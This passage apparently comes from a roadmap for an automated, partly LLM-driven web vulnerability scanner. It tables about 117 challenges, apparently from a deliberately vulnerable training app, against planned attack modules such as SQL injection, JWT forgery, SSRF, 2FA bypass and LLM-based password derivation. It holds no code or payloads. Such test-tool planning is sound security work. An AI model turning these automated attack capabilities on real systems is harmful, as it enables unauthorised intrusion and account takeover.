**Recommendation**: Accept 92% as the practical ceiling. These last 8 challenges add engineering cost disproportionate to their coverage gain.

---

## Implementation Priority

| Priority | Tiers | Coverage | Effort | Recommendation |
|----------|-------|----------|--------|----------------|
| **P0** | Tier 1 (items 1-9) | 56% | ~520 lines, 1-2 sessions | Do first. Pure code, immediate gains. |
| **P1** | Tier 2 (items 10-13) | 64% | ~400 lines, 1 session | Do second. Enhances existing code. |
| **P2** | Tier 3 (items 14-16) | 72% | ~300 lines + API calls | Needs OSV.dev API access. |
| **P3** | Tier 4 (items 17-19) | 84% | ~500 lines, LLM integration | Uses existing DeepSeek. High-value. |
| **P4** | Tier 5 (items 20-22) | 92% | ~400 lines, complex logic | Do last. Diminishing returns. |

**Total estimated new code**: ~2,100 lines across all tiers.

---

## Summary Table: Every Challenge and Its Required Capability

### Currently Detectable (✓) — 45 challenges

| # | Challenge | Executor | Confidence |
|---|-----------|----------|------------|
| 1 | Admin Section | IDORExecutor (forced browsing) | High |
| 2 | Five-Star Feedback | IDORExecutor | High |
| 3 | Forged Feedback | IDORExecutor | High |
| 4 | Forged Review | IDORExecutor | High |
| 5 | Manipulate Basket | IDORExecutor | High |
| 6 | Product Tampering | MassAssignmentExecutor | High |
| 7 | View Basket | IDORExecutor | High |
| 8 | Login Admin | SQLiExecutor | High |
| 9 | Login Bender | SQLiExecutor | High |
| 10 | Login Jim | SQLiExecutor | High |
| 11 | SSRF | SSRFExecutor | High |
| 12 | Upload Size | FileUploadExecutor | High |
| 13 | Upload Type | FileUploadExecutor | High |
| 14 | Confidential Document | PathTraversalExecutor | High |
| 15 | Exposed Metrics | InfoDisclosureExecutor | High |
| 16 | SQL Injection Login | SQLiExecutor | High |
| 17 | SQL Injection Schema | SQLiExecutor | Medium |
| 18 | SQL Injection Search | SQLiExecutor | High |
| 19 | NoSQL DoS | NoSQLiExecutor | High |
| 20 | NoSQL Exfiltration | NoSQLiExecutor | High |
| 21 | NoSQL Manipulation | NoSQLiExecutor | High |
| 22 | Security Policy | InfoDisclosureExecutor | High |
| 23 | Poison Null Byte | FileUploadExecutor | Medium |
| 24 | Unsigned JWT | JWTExecutor | High |
| 25 | Error Handling | InfoDisclosureExecutor | High |
| 26 | Redirects Tier 1 | SSRFExecutor | High |
| 27 | XXE Data Access | XXEExecutor | High |
| 28 | XXE DoS | XXEExecutor | High |
| 29 | Cross-Site Imaging | CORSExecutor | High |
| 30 | Login Credentials | CredentialSpray | High |
| 31 | Weak Password | AuthExecutor | High |
| 32 | JWT Issues 1 | JWTExecutor | High |
| 33 | Unsigned JWT Integrity | JWTExecutor | High |
| 34 | SSRF Redirect | SSRFExecutor | High |
| 35 | SSRF via Profile Image | SSRFExecutor + FileUpload | Medium |
| 36 | DOM XSS | BrowserXSS | High |
| 37 | Reflected XSS | XSSExecutor | High |
| 38 | Bonus Payload | XSSExecutor | Medium |
| 39 | Admin Registration | MassAssignmentExecutor | High |
| 40 | Deluxe Fraud | BusinessLogicExecutor | Medium |
| 41 | Payback Time | BusinessLogicExecutor | Medium |
| 42 | Zero Stars | BusinessLogicExecutor | Medium |
| 43 | CSRF Token Bypass | CSRFExecutor | High |
| 44 | Null Byte Injection | FileUploadExecutor | Medium |
| 45 | Race Condition | BusinessLogicExecutor | High |

### Tier 1 Unlocks (+15)

| # | Challenge | New Executor Needed |
|---|-----------|-------------------|
| 46 | SSTi | SSTIExecutor |
| 47 | Successful RCE DoS | CommandInjectionExecutor |
| 48 | Redirects Tier 2 | OpenRedirectExecutor |
| 49 | Allowlist Bypass | OpenRedirectExecutor |
| 50 | Whitelist Bypass | OpenRedirectExecutor |
| 51 | Oauth2 Redirect | OAuthMisconfigExecutor |
| 52 | Login Bjoern | OAuthMisconfigExecutor |
| 53 | CAPTCHA Bypass | CAPTCHABypassExecutor |
| 54 | Password Strength | PasswordPolicyExecutor |
| 55 | Repetitive Registration | RateLimitExecutor |
| 56 | Multiples Likes | RateLimitExecutor |
| 57 | Access Log | LogInjectionExecutor |
| 58 | Easter Egg | BackupFileScannerExecutor |
| 59 | Forgotten Developer Backup | BackupFileScannerExecutor |
| 60 | Forgotten Sales Backup | BackupFileScannerExecutor |

### Tier 2 Unlocks (+10)

| # | Challenge | Enhancement Needed |
|---|-----------|-------------------|
| 61 | Christmas Special | Advanced SQLi (UNION) |
| 62 | Database Schema | Advanced SQLi (schema extraction) |
| 63 | Ephemeral Accountant | Advanced SQLi (INSERT) |
| 64 | Stored XSS | Stored XSS flow (POST + GET) |
| 65 | HTTP Header XSS | Header injection XSS |
| 66 | Client-side XSS Protection | XSS filter bypass payloads |
| 67 | API-Only XSS | API response XSS |
| 68 | Server-side XSS Protection | Server-side filter bypass |
| 69 | Forged Signed JWT | RS256→HS256 key confusion |
| 70 | JWT Issues 2 | jku/jwk header injection |

### Tier 3 Unlocks (+9)

| # | Challenge | New Capability Needed |
|---|-----------|---------------------|
| 71 | Frontend Typosquatting | SCA scanner |
| 72 | Legacy Typosquatting Component | SCA scanner |
| 73 | Outdated Allowlist | SCA scanner |
| 74 | Supply Chain Component | SCA scanner |
| 75 | Vulnerable Library Component | SCA scanner |
| 76 | Supply Chain Attack | Typosquatting detector |
| 77 | Typosquatting | Typosquatting detector |
| 78 | Legacy Typosquatting | Typosquatting detector |
| 79 | Monitoring Bypass | WAF evasion detector |

### Tier 4 Unlocks (+14)

| # | Challenge | LLM Capability Needed |
|---|-----------|---------------------|
| 80 | Reset Jim's Password | Security question solver |
| 81 | Reset Bender's Password | Security question solver |
| 82 | Reset Bjoern's Password | Security question solver |
| 83 | Reset Morty's Password | Security question solver |
| 84 | Reset Uvogin's Password | Security question solver |
| 85 | Reset Password via Security Question | Security question solver |
| 86 | Bjoern's Favorite Pet | Security question solver |
| 87 | Login Amy | LLM password derivation |
| 88 | Login MC SafeSearch | LLM password derivation |
| 89 | Login Support Team | LLM password derivation |
| 90 | GDPR Data Erasure | LLM business logic explorer |
| 91 | Expired Coupon | LLM business logic explorer |
| 92 | GDPR Data Theft | LLM business logic explorer |
| 93 | Change Bender's Password | LLM business logic explorer |

### Tier 5 Unlocks (+9)

| # | Challenge | Advanced Capability Needed |
|---|-----------|--------------------------|
| 94 | Two Factor Authentication | 2FA bypass |
| 95 | Two Factor Auth Bypass | 2FA bypass |
| 96 | Weird Crypto | Crypto weakness detector |
| 97 | Nested Easter Egg Crypto | Crypto weakness detector |
| 98 | Premium Paywall | Crypto weakness detector |
| 99 | Privacy Policy Inspection | LLM content analyzer |
| 100 | Extra Language | LLM content analyzer |
| 101 | Mint the Honey Pot | LLM content analyzer |
| 102 | Deprecated Interface | LLM content analyzer |

### Unreachable (~8)

| # | Challenge | Reason |
|---|-----------|--------|
| 103 | Steganography | Image analysis library needed |
| 104 | Video XSS | App-specific subtitle parsing |
| 105 | Nested Easter Egg | Multi-step puzzle |
| 106 | Blockchain Hype | Domain-specific knowledge |
| 107 | Wallet Depletion | Complex timing chain |
| 108 | Stored XSS Tier 2 | Highly contextual bypass |
| 109 | Reflected XSS Tier 2 | Highly contextual bypass |
| 110 | Arbitrary File Write | Complex path traversal + write |
| 111 | Local File Read | App-specific LFI endpoint |
| 112 | Leaked Unsafe Product | App-specific hidden product |
| 113 | Mass Dispel | App-specific GDPR flow |
| 114 | Email Leak | App-specific error message |
| 115 | Leaked Access Log | App-specific log path |
| 116 | Vulnerable Library | Needs specific CVE + version check |
| 117 | Missing Encoding | Encoding-specific misconfig |

Note: Some "unreachable" items (110-117) MIGHT be caught by Tier 1-3 executors depending on the specific app behavior, but cannot be guaranteed.
